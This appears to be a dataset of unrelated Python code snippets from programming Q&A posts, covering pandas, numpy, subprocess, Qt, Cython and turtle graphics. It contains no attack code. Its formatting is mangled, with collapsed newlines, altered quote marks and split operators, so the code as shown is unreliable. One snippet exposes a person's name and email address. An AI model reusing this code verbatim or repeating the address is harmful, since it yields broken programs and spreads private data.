nosetests -- with-gae -- gae-lib-root=/usr/local/google_appengine/ -w . -w */test/ -v
try : someFunction ( ) except NameError : print ( `` someFunction ( ) not found . '' )
"[ 35 , 45 , 47 , 39 ... ] [ 47 , 60 , 57 , 55 ... ] [ 42 , 42 , 61 , 69 ... ] [ 62 , 70 , 62 , 65 ... ]"
"import subprocesserrors = 0num_workers = 10N = 100i = 0while i < N : processes = [ ] for j in range ( i , min ( i+num_workers , N ) ) : p = subprocess.Popen ( [ 'false ' ] ) processes.append ( p ) [ p.wait ( ) for p in processes ] exit_codes = [ p.returncode for p in processes ] errors += sum ( int ( e ! = 0 ) for e in exit_codes ) i += num_workersprint ( f '' There were { errors } / { N } errors '' ) import subprocessimport oserrors = 0num_workers = 40N = 100assigned = 0completed = 0processes = set ( ) while completed < N : if assigned < N : p = subprocess.Popen ( [ 'false ' ] ) processes.add ( ( assigned , p ) ) assigned += 1 if len ( processes ) > = num_workers or assigned == N : os.wait ( ) for i , p in frozenset ( processes ) : if p.poll ( ) is not None : completed += 1 processes.remove ( ( i , p ) ) err = p.returncode print ( i , err ) if err ! = 0 : errors += 1print ( f '' There were { errors } / { N } errors '' )"
"import pandas as pdlists= { 1 : [ [ 1 ] ] ,2 : [ [ 1,2,3 ] ] ,3 : [ [ 2,9,7,9 ] ] ,4 : [ [ 2,7,3,5 ] ] } # create test dataframedf=pd.DataFrame.from_dict ( lists , orient='index ' ) df=df.rename ( columns= { 0 : 'lists ' } ) df lists1 [ 1 ] 2 [ 1 , 2 , 3 ] 3 [ 2 , 9 , 7 , 9 ] 4 [ 2 , 7 , 3 , 5 ] dfOut [ 9 ] : lists rolllists1 [ 1 ] [ 1 ] 2 [ 1 , 2 , 3 ] [ 1 , 1 , 2 , 3 ] 3 [ 2 , 9 , 7 , 9 ] [ 1 , 2 , 3 , 2 , 9 , 7 , 9 ] 4 [ 2 , 7 , 3 , 5 ] [ 2 , 9 , 7 , 9 , 2 , 7 , 3 , 5 ] Group lists rolllists1 A [ 1 ] [ 1 ] 2 A [ 1 , 2 , 3 ] [ 1 , 1 , 2 , 3 ] 3 A [ 2 , 9 , 7 , 9 ] [ 1 , 2 , 3 , 2 , 9 , 7 , 9 ] 4 A [ 2 , 7 , 3 , 5 ] [ 2 , 9 , 7 , 9 , 2 , 7 , 3 , 5 ] 5 B [ 1 ] [ 1 ] 6 B [ 1 , 2 , 3 ] [ 1 , 1 , 2 , 3 ] 7 B [ 2 , 9 , 7 , 9 ] [ 1 , 2 , 3 , 2 , 9 , 7 , 9 ] 8 B [ 2 , 7 , 3 , 5 ] [ 2 , 9 , 7 , 9 , 2 , 7 , 3 , 5 ] TypeError : can not handle this type - > object"
"import numpy as npx = np.array ( [ 0,0,1,1,1,1,0,1,0,0 ] ) # Desired outputarray ( [ 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 ] ) x [ min ( min ( np.where ( x > =1 ) ) ) : ]"
"In [ 4 ] : message [ 'From ' ] Out [ 4 ] : '= ? utf-8 ? B ? aXNhYmVsIG1hcsOtYSB0b2Npbm8gZ2FyY8OtYQ== ? =\r\n\t < isatocino22 @ hotmail.com > ' In [ 5 ] : email.header.decode_header ( message [ 'From ' ] ) Out [ 5 ] : [ ( '= ? utf-8 ? B ? aXNhYmVsIG1hcsOtYSB0b2Npbm8gZ2FyY8OtYQ== ? =\r\n\t < isatocino22 @ hotmail.com > ' , None ) ] In [ 6 ] : email.header.decode_header ( message [ 'From ' ] .replace ( '\r\n\t ' , ' ' ) ) Out [ 6 ] : [ ( 'isabel mar\xc3\xada tocino garc\xc3\xada ' , 'utf-8 ' ) , ( ' < isatocino22 @ hotmail.com > ' , None ) ]"
import gcgc.disable ( )
"import numpy as npfrom sklearn import linear_model , datasetsnp.random.seed ( 0 ) regdata = datasets.make_regression ( 100 , 1 , noise = 20.0 )"
"def __exit__ ( self , exc_type , exc_val , exc_tb ) : def __exit__ ( self , exc_type : Exception , exc_val : TracebackException , exc_tb : TracebackType ) :"
"from numpy import ndarrayimport randomimport datetimefrom pandas import DataFrame , HDFStoredef create ( n ) : mylist = [ ' A ' * 4 , ' B ' * 4 , ' C ' * 4 , 'D ' * 4 ] data = [ ] for i in range ( n ) : data.append ( ( random.choice ( mylist ) , datetime.datetime.now ( ) - datetime.timedelta ( minutes=i ) ) ) data_np = ndarray ( len ( data ) , dtype= [ ( 'fac ' , 'U6 ' ) , ( 'ts ' , 'datetime64 [ us ] ' ) ] ) data_np [ : ] = data df = DataFrame ( data_np ) return dfdef create_patches ( n , nn ) : for i in range ( n ) : yield create ( nn ) df = create_patches ( 100 , 1000000 ) store = HDFStore ( 'check.hd5 ' ) for each in df : store.append ( 'df ' , each , index=False , data_columns=True , format = 'table ' ) store.close ( ) In [ 1 ] : % timeit store.select ( 'df ' , [ 'ts > Timestamp ( `` 2016-07-12 10:00:00 '' ) ' ] ) 1 loops , best of 3 : 13.2 s per loop In [ 2 ] : store.create_table_index ( 'df ' , columns= [ 'ts ' ] , kind='full ' ) In [ 3 ] : % timeit store.select ( 'df ' , [ 'ts > Timestamp ( `` 2016-07-12 10:00:00 '' ) ' ] ) 1 loops , best of 3 : 12 s per loop"
> > > import urllib2 > > > conn = urllib2.urlopen ( `` http : //api.stackoverflow.com/0.8/users/ '' ) > > > conn.readline ( ) '\x1f\x8b\x08\x00\x00\x00\x00\x00\x04\x00\xed\xbd\x07 ` \x1cI\x96 % & /m\xca { \x7fJ\ ...
"not_null_locations = pandas.notnull ( df ) .values.astype ( int ) common_obs = pandas.DataFrame ( not_null_locations.T.dot ( not_null_locations ) , columns=df.columns , index=df.columns )"
"Traceback ( most recent call last ) : File `` model_neural_simplified.py '' , line 318 , in < module > main ( **arg_parser ( ) ) File `` model_neural_simplified.py '' , line 314 , in main globals ( ) [ command ] ( **kwargs ) File `` model_neural_simplified.py '' , line 304 , in predict next_neural_data , next_sample = reader.get_next_result ( ) File `` /project_neural_mouse/src/asyncs3/s3reader.py '' , line 174 , in get_next_result result = future.result ( ) File `` /usr/lib/python3.6/concurrent/futures/_base.py '' , line 432 , in result return self.__get_result ( ) File `` /usr/lib/python3.6/concurrent/futures/_base.py '' , line 384 , in __get_result raise self._exception File `` /usr/lib/python3.6/concurrent/futures/thread.py '' , line 56 , in run result = self.fn ( *self.args , **self.kwargs ) File `` model_neural_simplified.py '' , line 245 , in read_sample f_bytes = s3f.read ( read_size ) File `` /project_neural_mouse/src/asyncs3/s3reader.py '' , line 374 , in read size , b = self._issue_request ( S3Reader.READ , ( self.url , size , self.position ) ) File `` /project_neural_mouse/src/asyncs3/s3reader.py '' , line 389 , in _issue_request response = self.communication_channels [ uuid ] .get ( ) File `` /usr/lib/python3.6/multiprocessing/queues.py '' , line 113 , in get return _ForkingPickler.loads ( res ) File `` /usr/local/lib/python3.6/dist-packages/aiohttp/client_exceptions.py '' , line 133 , in __init__ super ( ) .__init__ ( os_error.errno , os_error.strerror ) AttributeError : 'str ' object has no attribute 'errno ' import pickleose = OSError ( 1 , 'unittest ' ) class SubOSError ( OSError ) : def __init__ ( self , foo , os_error ) : super ( ) .__init__ ( os_error.errno , os_error.strerror ) cce = SubOSError ( 1 , ose ) cce_pickled = pickle.dumps ( cce ) pickle.loads ( cce_pickled ) ./python.exe ../backups/bpo38254.pyTraceback ( most recent call last ) : File `` /Users/karthikeyansingaravelan/stuff/python/cpython/../backups/bpo38254.py '' , line 12 , in < module > pickle.loads ( cce_pickled ) File `` /Users/karthikeyansingaravelan/stuff/python/cpython/../backups/bpo38254.py '' , line 8 , in __init__ super ( ) .__init__ ( os_error.errno , os_error.strerror ) AttributeError : 'str ' object has no attribute 'errno '"
"> > > np.random.randn ( 3,3 ) array ( [ [ -0.35557367 , -0.0561576 , -1.84722985 ] , [ 0.89342124 , -0.50871646 , 1.31368413 ] , [ 0.0062188 , 1.62968789 , 0.72367089 ] ] ) > > > np.empty ( ( 3,3 ) ) array ( [ [ 0.35557367 , 0.0561576 , 1.84722985 ] , [ 0.89342124 , 0.50871646 , 1.31368413 ] , [ 0.0062188 , 1.62968789 , 0.72367089 ] ] )"
"lst = [ ( 'apple ' , 'banana ' , 'carrots ' ) , ( 'apple ' , ) , ( 'banana ' , 'carrots ' , ) ] apple banana carrots0 1 1 11 1 0 02 0 1 1 pd.DataFrame ( lst ) 0 1 20 apple banana carrots1 apple None None2 banana carrots None"
"import numpy as npimport timet1 = time.time ( ) for i in range ( 1,10000000 ) : np.log ( i ) t2 = time.time ( ) print ( t2 - t1 ) import mathimport timet1 = time.time ( ) for i in range ( 1,10000000 ) : math.log ( i ) t2 = time.time ( ) print ( t2 - t1 ) ticfor i = 1:10000000 log ( i ) ; endtoc var t = DateTime.Now ; for ( int i = 1 ; i < 10000000 ; ++i ) Math.Log ( i ) ; Console.WriteLine ( ( DateTime.Now - t ) .TotalSeconds ) ;"
"In [ 1 ] : a = [ 1,2,3,4,5,6,7,8,9 ] In [ 4 ] : a [ 1:7:2 ] # start from index = 1 to index < 7 , with step = 2Out [ 4 ] : [ 2 , 4 , 6 ]"
for tz in pytz.common_timezones_set : print tz
> > > foo = 'bar ' > > > baz = f'Hanging on in { foo } ' > > > baz'Hanging on in bar ' > > > foo = 'spam ' > > > baz'Hanging on in bar '
"from Qt import QtWidgets # this really imports PyQt4.QtGui # Qt.pyimport sysimport PyQt4.Qtsys.modules [ `` Qt '' ] = PyQt4PyQt4.QtWidgets = PyQt4.QtGui print sys > > > None # Xyz.pyimport osimport syssys.modules [ 'Xyz ' ] = osprint sys # this will print `` None '' $ pythonPython 2.7.11 ( default , Jan 22 2016 , 08:29:18 ) [ GCC 4.2.1 Compatible Apple LLVM 7.0.2 ( clang-700.1.81 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import XyzNone"
"input - > result '' abc '' - > [ [ ' a',1 ] , [ ' b',1 ] , [ ' c',1 ] ] '' bbbc '' - > [ [ ' b',3 ] , [ ' c',1 ] ] '' cccaa '' - > [ [ ' a',2 ] , [ ' c',3 ] ] from pyparsing import *def handleStuff ( string , location , tokens ) : return [ tokens [ 0 ] [ 0 ] , len ( tokens [ 0 ] ) ] stype = Word ( `` abc '' ) .setParseAction ( handleStuff ) section = ZeroOrMore ( stype ( `` stype '' ) ) print section.parseString ( `` abc '' ) .dump ( ) print section.parseString ( `` aabcc '' ) .dump ( ) print section.parseString ( `` bbaaa '' ) .dump ( )"
"[ 0,1,2,3,4 ] [ 0,1,2,3,4 ] , [ 0,1,2,3 ] , [ 1,2,3,4 ] , [ 0,1,2 ] , [ 1,2,3 ] , [ 2,3,4 ] , [ 0,1 ] , [ 1,2 ] , [ 2,3 ] , [ 3,4 ] , [ 0 ] , [ 1 ] , [ 2 ] , [ 3 ] , [ 4 ]"
"import requestsfrom utils import make_basic_auth_header , confcode = ' < Auth code here > 'url = `` % s/identity/v1/oauth2/token '' % conf ( 'EBAY_API_PREFIX ' ) headers = { 'Content-Type ' : 'application/x-www-form-urlencoded ' , 'Authorization ' : make_basic_auth_header ( ) } data = { 'grant_type ' : 'authorization_code ' , # 'grant_type ' : 'refresh_token ' , 'state ' : None , 'code ' : code , 'redirect_uri ' : conf ( 'EBAY_RUNAME ' ) } r = requests.post ( url , data=data , headers=headers , ) def make_basic_auth_header ( ) : auth_header_payload = ' % s : % s ' % ( conf ( 'EBAY_APP_ID ' ) , conf ( 'EBAY_CERT_ID ' ) ) auth_header_base64 = base64.b64encode ( auth_header_payload ) auth_header = 'Basic % s ' % auth_header_base64 return auth_header { u'error_description ' : u'request is missing a required parameter or malformed . ' , u'error ' : u'invalid_request ' }"
"01000200030004020511050006000702051108020511090205111002051111020511120205111300140205111500160017001800190020002100 [ [ '01 ' , 00 ] , [ '02 ' , 00 ] , [ '03 ' , 00 ] , [ '04 ' , 020511 ] , [ '05 ' , 00 ] , [ '06 ' , 00 ] , [ '07 ' , 020511 , [ '08 ' , 020511 ] , [ '09 ' , 020511 ] , [ '10 ' , 020511 , ] , [ '11 ' , 020511 ] , [ '12 ' , 020511 ] , [ '13 ' , 00 ] , [ '14 ' , 020511 ] , [ '15 ' , 00 ] , [ '16 ' , 00 ] , [ '17 ' , 00 ] , [ '18 ' , 00 ] , [ '19 ' , 00 ] , [ '20 ' , 00 ] , [ '21 ' , 00 ] ] [ '01 ' , '02 ' , '03 ' , '0402051105 ' , '06 ' , '0702051108020511090205111 ' , '20511110205111202051113 ' , '1402051115 ' , '16 ' , '17 ' , '18 ' , '19 ' , ' 2 ' , '021 ' , `` ] re.split ( '020511|00 ' , theStr ) [ '01 ' , '02 ' , '03 ' , '04 ' , '05 ' , '06 ' , '07 ' , '08 ' , '09 ' , ' 1 ' , '2051111 ' , '12 ' , '13 ' , '14 ' , '15 ' , '16 ' , '17 ' , '18 ' , '19 ' , ' 2 ' , '021 ' , `` ]"
"> df a b 0 1 set ( [ 2 , 3 ] ) 1 2 set ( [ 2 , 3 ] ) 2 3 set ( [ 4 , 5 , 6 ] ) 3 1 set ( [ 1 , 34 , 3 , 2 ] ) > df.groupby ( ' a ' ) .sum ( ) a b 1 NaN2 set ( [ 2 , 3 ] ) 3 set ( [ 4 , 5 , 6 ] ) a b 1 set ( [ 2 , 3 , 1 , 34 ] ) 2 set ( [ 2 , 3 ] ) 3 set ( [ 4 , 5 , 6 ] )"
"df_temp = pd.DataFrame ( np.random.randn ( 100000000,1 ) , columns=list ( ' A ' ) ) % time df_temp [ `` q '' ] = df_temp [ `` A '' ] .quantile ( 0.01 ) % time df_temp.loc [ : , `` q1_loc '' ] = df_temp [ `` A '' ] .quantile ( 0.01 )"
p = Ether ( ) / IP ( ) < Ether ... | IP ... >
"import numpy as npimport pandas as pdaframe = pd.DataFrame ( [ np.arange ( 10000 ) , np.arange ( 10000 ) * 2 ] ) .Taframe.index = pd.date_range ( `` 2015-09-01 '' , periods = 10000 , freq = `` 1min '' ) aframe.head ( ) Out [ 174 ] : 0 12015-09-01 00:00:00 0 02015-09-01 00:01:00 1 22015-09-01 00:02:00 2 42015-09-01 00:03:00 3 62015-09-01 00:04:00 4 8aframe.tail ( ) Out [ 175 ] : 0 12015-09-07 22:35:00 9995 199902015-09-07 22:36:00 9996 199922015-09-07 22:37:00 9997 199942015-09-07 22:38:00 9998 199962015-09-07 22:39:00 9999 19998 aframe.ix [ `` 2015-09-02 07:00:00 '' ] Out [ 176 ] : 0 18601 3720Name : 2015-09-02 07:00:00 , dtype : int64 aframe.ix [ `` * 07:00:00 '' ]"
"glay = QtWidgets.QGridLayout ( right_container ) glay.addWidget ( lineedit , 0 , 0 ) glay.addWidget ( button2 , 0 , 2 ) glay.addWidget ( widget , 2 , 0 , 1 , 3 ) glay.addWidget ( button , 4 , 0 ) glay.addWidget ( button1 , 4 , 2 ) glay.setColumnStretch ( 1 , 1 ) # setColumnStretchglay.setRowStretch ( 1 , 1 ) # setRowStretchglay.setRowStretch ( 2 , 2 ) # setRowStretchglay.setRowStretch ( 3 , 1 ) # setRowStretch"
"winsound.PlaySound ( `` file.wav '' , winsound.SND_FILENAME ) # the wav file is in the same directory as the program init ( ) # this is pygame.init ( ) , I only imported init and the mixer modulepygame.mixer.init ( ) # initializes pygame.mixerpygame.mixer.music.load ( filename ) # loads it in musicpygame.mixer.music.play ( ) # plays it in musictime.sleep ( 20 ) import pyttsxengine = pyttsx.init ( ) def tts ( mytext ) : engine.say ( mytext ) engine.runAndWait ( )"
... for path in e.paths ( ) : keyparts = [ ] msgs = [ ] for exc in path : exc.msg and msgs.extend ( exc.messages ( ) ) # < -- what is that ? keyname = exc._keyname ( ) keyname and keyparts.append ( keyname ) # < -- and that errors [ ' . '.join ( keyparts ) ] = ' ; '.join ( interpolate ( msgs ) ) return errors ...
"lst = [ ' A B C D ' , ' E F G H I J ' , ' K L M N ' ] l = [ ] for i in lst : for j in i.split ( ) : print ( j ) l.append ( j ) first = l [ : :2 ] second = l [ 1 : :2 ] [ m+ ' '+str ( n ) for m , n in zip ( first , second ) ] lst = [ ' A B ' , ' C D ' , ' E F ' , ' G H ' , ' I J ' , ' K L ' , 'M N ' ] lst = [ ' A B ' , ' B C ' , ' C D ' , ' E F ' , ' F G ' , ' G H ' , ' H I ' , ' I J ' , ' K L ' , ' L M ' , 'M N ' ]"
"Undefined symbols for architecture x86_64 : `` boost : :python : :objects : :function_object ( boost : :python : :objects : :py_function const & , std : :pair < boost : :python : :detail : :keyword const* , boost : :python : :detail : :keyword const* > const & ) . . . `` boost : :python : :objects : :register_dynamic_id_aux ( boost : :python : :type_info , std : :pair < void* , boost : :python : :type_info > ( * ) ( void* ) ) '' otool -L libboost_python-mt.dyliblibboost_python-mt.dylib : /opt/local/lib/libboost_python-mt.dylib ( compatibility version 0.0.0 , current version 0.0.0 ) /opt/local/Library/Frameworks/Python.framework/Versions/2.7/Python ( compatibility version 2.7.0 , current version 2.7.0 ) /usr/lib/libc++.1.dylib ( compatibility version 1.0.0 , current version 120.0.0 ) /usr/lib/libSystem.B.dylib ( compatibility version 1.0.0 , current version 1197.1.1 ) nm libboost_python-mt.dylib | c++filt | grep boost : :python : :objects : :function_object 0000000000013d60 T boost : :python : :objects : :function_object ( boost : :python : :objects : :py_function const & ) 0000000000013d00 T boost : :python : :objects : :function_object ( boost : :python : :objects : :py_function const & , std : :__1 : :pair < boost : :python : :detail : :keyword const* , boost : :python : :detail : :keyword const* > const & )"
project/|- > main.py|- > libs/ |- > tornado/ ( The full git rep as a submodule ) |- > tornado/ ( The actual package ) |- > sqlalchemy/|- > src/ |- > support-1.py |- > support-2.py|- > static/ - > js/ - > img/ - > css/|- > templates/
"def calculate_bsf_u_loop ( uvel , dy , dz ) : `` '' '' Calculate barotropic stream function from zonal velocity uvel ( t , z , y , x ) dy ( y , x ) dz ( t , z , y , x ) bsf ( t , y , x ) `` '' '' nt = uvel.shape [ 0 ] nz = uvel.shape [ 1 ] ny = uvel.shape [ 2 ] nx = uvel.shape [ 3 ] bsf = np.zeros ( ( nt , ny , nx ) ) for jn in range ( 0 , nt ) : for jk in range ( 0 , nz ) : for jj in range ( 0 , ny ) : for ji in range ( 0 , nx ) : bsf [ jn , jj , ji ] = bsf [ jn , jj , ji ] + uvel [ jn , jk , jj , ji ] * dz [ jn , jk , jj , ji ] * dy [ jj , ji ] return bsf import numpy as npcimport numpy as npcimport cython @ cython.boundscheck ( False ) # turn off bounds-checking for entire function @ cython.wraparound ( False ) # turn off negative index wrapping for entire function # # Use cpdef instead of def # # Define types for arrayscpdef calculate_bsf_u_loop ( np.ndarray [ np.float64_t , ndim=4 ] uvel , np.ndarray [ np.float64_t , ndim=2 ] dy , np.ndarray [ np.float64_t , ndim=4 ] dz ) : `` '' '' Calculate barotropic stream function from zonal velocity uvel ( t , z , y , x ) dy ( y , x ) dz ( t , z , y , x ) bsf ( t , y , x ) `` '' '' # # cdef the constants cdef int nt = uvel.shape [ 0 ] cdef int nz = uvel.shape [ 1 ] cdef int ny = uvel.shape [ 2 ] cdef int nx = uvel.shape [ 3 ] # # cdef loop indices cdef ji , jj , jk , jn # # cdef . Note that the cdef is followed by cython type # # but the np.zeros function as python ( numpy ) type cdef np.ndarray [ np.float64_t , ndim=3 ] bsf = np.zeros ( [ nt , ny , nx ] , dtype=np.float64 ) for jn in xrange ( 0 , nt ) : for jk in xrange ( 0 , nz ) : for jj in xrange ( 0 , ny ) : for ji in xrange ( 0 , nx ) : bsf [ jn , jj , ji ] += uvel [ jn , jk , jj , ji ] * dz [ jn , jk , jj , ji ] * dy [ jj , ji ] return bsf for jn in range ( 0 , nt ) : for jk in range ( 0 , nz ) : bsf [ jn , : , : ] = bsf [ jn , : , : ] + uvel [ jn , jk , : , : ] * dz [ jn , jk , : , : ] * dy [ : , : ]"
"dict1= { 808 : [ [ ' a ' , 5.4 , ' b ' ] , [ ' c ' , 4.1 , ' b ' ] , [ 'd ' , 3.7 , ' f ' ] ] } memberid userid score related808 a 5.4 b808 c 4.1 b808 d 3.7 f df=pd.DataFrame.from_dict ( dict1 , orient='index ' )"
"import matplotlib.pyplot as pltimport numpy as np from skimage.segmentation import felzenszwalbfrom skimage.io import imreadimg = imread ( 'test.jpg ' ) segments_fz = felzenszwalb ( img , scale=100 , sigma=0.2 , min_size=50 ) print ( `` Felzenszwalb number of segments { } '' .format ( len ( np.unique ( segments_fz ) ) ) ) plt.imshow ( segments_fz ) plt.tight_layout ( ) plt.show ( )"
"def TurtleShape ( ) : try : # Tkinter buttons related to turtle manipulation manipulateimage.config ( state = NORMAL ) flipButton.config ( state = NORMAL ) mirrorButton.config ( state = NORMAL ) originalButton.config ( state = NORMAL ) resetturtle.config ( state = NORMAL ) rotateButton.config ( state = NORMAL ) # Ask user for file name from tkinter file dialog , and return file name as ` klob ` global klob klob = filedialog.askopenfilename ( ) global im # Open ` klob ` and return as ` im ` im = Image.open ( klob ) # Append ` im ` to pictures deque pictures.append ( im ) # Clear ` edited ` deque edited.clear ( ) # Save ` im ` as an image , then register image as shape , and finally set image as turtle shape im.save ( klob + '.gif ' , `` GIF '' ) register_shape ( klob + '.gif ' ) shape ( klob + '.gif ' ) update ( ) except : # If user selects cancel in file dialog , then pass passdef StampPic ( ) : stamp ( ) draw_space ( ) # Go forward 100 pixels with pen up after every stamp update ( ) def TurtleImageResize ( ) : if not hasattr ( TurtleImageResize , `` counter '' ) : TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size [ 0 ] # height = original height of image height = im.size [ 1 ] # Allow user to enter new width for image NewOne2 = numinput ( 'Width of Image ' , 'Set the width of the image : ' , minval = 1 ) # Allow user to enter new height for image NewOne = numinput ( 'Height of Image ' , 'Set the height of your image : ' , minval = 1 ) # Set width to user input if user input is NOT nothing . Otherwise , use ` width ` as picture width . Picwidth = NewOne2 if NewOne2 ! = None else width # Set height to user input if user input is NOT None . Otherwise , use ` height ` as picture height . Picheight = NewOne if NewOne ! = None else height try : # Secondary Step : Take ORIGINAL image appended to ` jiop ` ( from ` except : ` code block succeeding ` try : ` code block ) and resize THAT image each time this function is called twice in a row . Otherwise , if ONLY called as a secondary step , take previously edited image from ` edited ` deque , resize that , and append newly edited image to the ` edited ` deque . try : # ` jiop ` is a deque hye = jiop.pop ( ) jiop.append ( hye ) print ( `` Jiop '' ) except : hye = edited.pop ( ) jiop.append ( hye ) print ( `` Edited '' ) # Resize Image to Picwidth and Picheight editpic = hye.resize ( ( int ( Picwidth ) , int ( Picheight ) ) , Image.ANTIALIAS ) edited.append ( editpic ) print ( `` Hooplah ! '' ) except : # Intial step : Take image appended to ` pictures ` deque from ` TurtleShape ` function , then edit that and append newly edited image to both ` editpic ` and ` pictures ` geer = pictures.pop ( ) # Resize Image to Picwidth and Picheight editpic = geer.resize ( ( int ( Picwidth ) , int ( Picheight ) ) , Image.ANTIALIAS ) jiop.append ( geer ) edited.append ( editpic ) pictures.append ( editpic ) print ( `` Normal '' ) # Save image as ` .gif ` editpic.save ( klob + str ( TurtleImageResize.counter ) + '.gif ' , 'GIF ' ) # Register image as a shape , and use it as shape of turtle register_shape ( klob + str ( TurtleImageResize.counter ) + '.gif ' ) shape ( klob + str ( TurtleImageResize.counter ) + '.gif ' ) update ( ) def flippic ( ) : if not hasattr ( flippic , `` counter '' ) : flippic.counter = 0 flippic.counter += 1 try : # Secondary step : Take previously edited image from ` edited ` deque , manipulate that , and append newly edited image to the ` edited ` deque jiop.clear ( ) ghy = edited.pop ( ) # Flip image over horizontal line kpl = ImageOps.flip ( ghy ) edited.append ( kpl ) print ( `` Jlop '' ) except : # Initial step : Take image appended to ` pictures ` deque from ` TurtleShape ` function , then edit that and append newly edited image to both ` editpic ` and ` pictures ` neer = pictures.pop ( ) # Flip image over horizontal line kpl = ImageOps.flip ( neer ) pictures.append ( kpl ) edited.append ( kpl ) print ( `` Yup '' ) # Save image as ` .gif ` kpl.save ( klob + str ( flippic.counter ) + '.gif ' , `` GIF '' ) # Register image as a shape , and use it as shape of turtle register_shape ( klob + str ( flippic.counter ) + '.gif ' ) shape ( klob + str ( flippic.counter ) + '.gif ' ) update ( ) def mirror ( ) : if not hasattr ( mirror , `` counter '' ) : mirror.counter = 0 mirror.counter += 1 try : jiop.clear ( ) jui = edited.pop ( ) # Flip image over vertical line fgrt = ImageOps.mirror ( jui ) edited.append ( fgrt ) except : bbc = pictures.pop ( ) # Flip image over vertical line fgrt = ImageOps.mirror ( bbc ) pictures.append ( fgrt ) edited.append ( fgrt ) fgrt.save ( klob + str ( mirror.counter ) + `` .gif '' ) register_shape ( klob + str ( mirror.counter ) + `` .gif '' ) shape ( klob + str ( mirror.counter ) + `` .gif '' ) update ( ) def rotatePic ( ) : if not hasattr ( rotatePic , `` counter '' ) : rotatePic.counter = 0 rotatePic.counter += 1 try : jiop.clear ( ) lmcb = edited.pop ( ) # Rotate image 90º right fetch = lmcb.rotate ( -90 , expand = True ) edited.append ( fetch ) except : bolt = pictures.pop ( ) # Rotate image 90º right fetch = bolt.rotate ( -90 , expand = True ) pictures.append ( fetch ) edited.append ( fetch ) fetch.save ( klob + str ( rotatePic.counter ) + `` .gif '' ) register_shape ( klob + str ( rotatePic.counter ) + `` .gif '' ) shape ( klob + str ( rotatePic.counter ) + `` .gif '' ) update ( ) import os , shutil , subprocess , sysher = sys.platformif her == `` win32 '' : print ( `` Windows is your Operating System '' ) win_gs = [ `` gs '' , '' gswin32c '' , '' gswin64c '' ] if all ( shutil.which ( gs_version ) is None for gs_version in win_gs ) : paths = [ `` C : \\Program Files\\gs\\gs9.18\\bin '' , '' C : \\Program Files ( x86 ) \\gs\\gs9.18\\bin '' ] for path in ( x for x in paths if os.path.exists ( x ) ) : os.environ [ `` PATH '' ] += `` ; '' + path break if any ( shutil.which ( gs_version ) for gs_version in win_gs ) : print ( `` GhostScript 9.18 for Windows found and utilized '' ) else : print ( `` You do not have GhostScript 9.18 installed for Windows . Please install it . '' ) sys.exit ( 0 ) else : print ( `` GhostScript 9.18 for Windows found and utilized '' ) elif her == 'darwin ' : print ( `` Macintosh is your Operating System '' ) if shutil.which ( `` gs '' ) is None : os.environ [ `` PATH '' ] += `` : /usr/local/bin '' if shutil.which ( `` gs '' ) is None : print ( `` You do not have GhostScript installed for Macintosh . Please install it . '' ) sys.exit ( 0 ) else : print ( `` GhostScript for Macintosh found and utilized '' ) from turtle import *from tkinter import *try : import tkinter.filedialog as filedialogexcept ImportError : passimport collectionsfrom PIL import Image , ImageEnhance , ImageOpsjiop = collections.deque ( ) pictures = collections.deque ( ) edited = collections.deque ( ) picwidth = collections.deque ( ) picheight = collections.deque ( ) def draw_space ( ) : # Draw a space 200 pixels wide . penup ( ) forward ( 200 ) pendown ( ) def TurtleShape ( ) : try : manipulateimage.config ( state = NORMAL ) flipButton.config ( state = NORMAL ) mirrorButton.config ( state = NORMAL ) rotateButton.config ( state = NORMAL ) global klob klob = filedialog.askopenfilename ( ) global im im = Image.open ( klob ) pictures.append ( im ) edited.clear ( ) im.save ( klob + '.gif ' , `` GIF '' ) register_shape ( klob + '.gif ' ) shape ( klob + '.gif ' ) update ( ) except AttributeError : passdef TurtleImageResize ( ) : if not hasattr ( TurtleImageResize , `` counter '' ) : TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size [ 0 ] height = im.size [ 1 ] NewOne2 = numinput ( 'Width of Image ' , 'Set the width of the image : ' , minval = 1 ) NewOne = numinput ( 'Height of Image ' , 'Set the height of your image : ' , minval = 1 ) Picwidth = NewOne2 if NewOne2 ! = None else width picwidth.append ( Picwidth ) Picheight = NewOne if NewOne ! = None else height picheight.append ( Picheight ) try : try : hye = jiop.pop ( ) jiop.append ( hye ) except : hye = edited.pop ( ) jiop.append ( hye ) editpic = hye.resize ( ( int ( Picwidth ) , int ( Picheight ) ) , Image.ANTIALIAS ) edited.append ( editpic ) pictures.append ( editpic ) except : geer = pictures.pop ( ) editpic = geer.resize ( ( int ( Picwidth ) , int ( Picheight ) ) , Image.ANTIALIAS ) jiop.append ( geer ) edited.append ( editpic ) pictures.append ( editpic ) editpic.save ( klob + str ( TurtleImageResize.counter ) + '.gif ' , 'GIF ' ) register_shape ( klob + str ( TurtleImageResize.counter ) + '.gif ' ) shape ( klob + str ( TurtleImageResize.counter ) + '.gif ' ) update ( ) def flippic ( ) : if not hasattr ( flippic , `` counter '' ) : flippic.counter = 0 flippic.counter += 1 try : jiop.clear ( ) ghy = edited.pop ( ) kpl = ImageOps.flip ( ghy ) edited.append ( kpl ) pictures.append ( kpl ) print ( `` Jlop '' ) except : neer = pictures.pop ( ) kpl = ImageOps.flip ( neer ) pictures.append ( kpl ) edited.append ( kpl ) print ( `` Yup '' ) kpl.save ( klob + str ( flippic.counter ) + '.gif ' , `` GIF '' ) register_shape ( klob + str ( flippic.counter ) + '.gif ' ) shape ( klob + str ( flippic.counter ) + '.gif ' ) update ( ) def mirror ( ) : if not hasattr ( mirror , `` counter '' ) : mirror.counter = 0 mirror.counter += 1 try : jiop.clear ( ) jui = edited.pop ( ) fgrt = ImageOps.mirror ( jui ) edited.append ( fgrt ) pictures.append ( fgrt ) except : bbc = pictures.pop ( ) fgrt = ImageOps.mirror ( bbc ) pictures.append ( fgrt ) edited.append ( fgrt ) fgrt.save ( klob + str ( mirror.counter ) + `` .gif '' ) register_shape ( klob + str ( mirror.counter ) + `` .gif '' ) shape ( klob + str ( mirror.counter ) + `` .gif '' ) update ( ) def rotatePic ( ) : if not hasattr ( rotatePic , `` counter '' ) : rotatePic.counter = 0 rotatePic.counter += 1 try : jiop.clear ( ) lmcb = edited.pop ( ) fetch = lmcb.rotate ( -90 , expand = True ) edited.append ( fetch ) pictures.append ( fetch ) except : bolt = pictures.pop ( ) fetch = bolt.rotate ( -90 , expand = True ) pictures.append 